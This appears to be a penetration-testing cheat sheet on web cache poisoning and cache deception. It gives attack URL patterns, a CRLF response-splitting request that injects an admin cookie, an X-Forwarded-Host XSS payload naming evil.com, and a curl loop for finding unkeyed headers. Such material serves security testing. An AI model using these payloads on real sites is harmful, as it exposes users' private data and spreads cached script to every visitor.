# Advanced Cache Poisoning Techniques

## Cache Deception Attack

Trick the cache into storing private authenticated data under a URL accessible to anyone.

### Basic Deception
```
Victim URL: https://target.com/profile/sensitive-data
Attacker URL: https://target.com/profile/sensitive-data/poc.css
              https://target.com/profile/sensitive-data.jpg
              https://target.com/profile/sensitive-data;.css

Attack flow:
1. Attacker sends victim: https://target.com/profile/sensitive-data/poc.css
2. Application serves the victim's private data (path routing ignores extension)
3. Cache sees .css extension → caches as static content
4. Attacker visits the same URL anonymously → gets victim's cached data
```

### Detection
- Test: append common static extensions to authenticated endpoints
- Check: does the app return the same content for /private and /private.css?
- Check: does the cache store it? (X-Cache: HIT on subsequent anonymous request)

## Unkeyed Cookie Attack

Cookies are often excluded from cache keys but the application behavior may depend on them:
```
Set cookie: preferences=evil_theme
Request page → application renders with evil theme
Response cached
Other users get the evil theme (if reflected content had XSS)
```

## Parameter Cloaking

Different parsers treat the same URL differently:
```
URL: /page?key=good&key=evil

# Depending on the server:
PHP uses: $_GET['key'] = 'evil'     (last wins)
.NET uses: key = 'good,evil'         (concatenates)
Ruby Rack: key = 'good'              (first wins)
Python CGI: key = 'evil'             (last wins)
```

If the CACHE parses one way and the SERVER parses another way, you can poison:
```
Cache sees: /page?key=safe (keys on 'safe')
Server sees: /page?key=evil (processes evil)
Cache serves 'safe' version with evil side-effects
```

## Cache Key Normalization Confusion

Caches normalize URLs. Servers may not. Differences create exploitation opportunities:

### Path Normalization
```
/page/          → normalized to /page by cache, but /page/ by app
/page%20        → trailing space in key
/page/./        → cache may strip, app may not
/a/../page      → cache may resolve, app may not
```

### Fragment Injection
Browser URL fragments (#) aren't sent to servers. But cache servers may see them differently from origin servers in some configurations.

## HTTP Response Splitting via Cache

If you can inject response headers into a cached response (via vulnerable endpoint that reflects headers without sanitization):
```
GET /?userInput=test%0d%0aSet-Cookie:%20admin=true

If the response is cached with the injected Set-Cookie:
All users requesting that URL get "Set-Cookie: admin=true"
```

## Cache Key Injection via Unkeyed Headers

Find headers that affect the response AND are unkeyed. Build a poisoning payload:
```
X-Forwarded-Host: evil.com/<script>alert(1)</script>
```

If the application uses X-Forwarded-Host to construct URLs in the response (canonical links, redirects, meta refresh), your script tag gets rendered and cached.

## Poisoning with Cache Busters (Safe Testing)

Always use cache busters during testing to avoid affecting real users:
```
Step 1: Request with cache buster AND poisoning payload
  GET /page?cb=uniqueid12345
  X-Forwarded-Host: canary.example.com

Step 2: Verify poisoning (second request without header)
  GET /page?cb=uniqueid12345
  (check if canary.example.com appears in response)

Step 3: Cleanup (let cache expire or use invalidation API)
```

## Finding Unkeyed Inputs

Systematic discovery:
```bash
# Send each candidate header with a unique value
for header in X-Forwarded-Host X-Forwarded-Scheme X-Host X-Original-URL X-Rewrite-URL X-Forwarded-Proto; do
  canary="canary-${header}-$(date +%s)"
  response=$(curl -s -H "$header: $canary" https://target.com/page)
  
  # Check if canary reflected
  if echo "$response" | grep -q "$canary"; then
    echo "REFLECTED: $header → check for cache poisoning"
  fi
done
```

Use Param Miner (Burp extension) for automated discovery of unkeyed inputs.
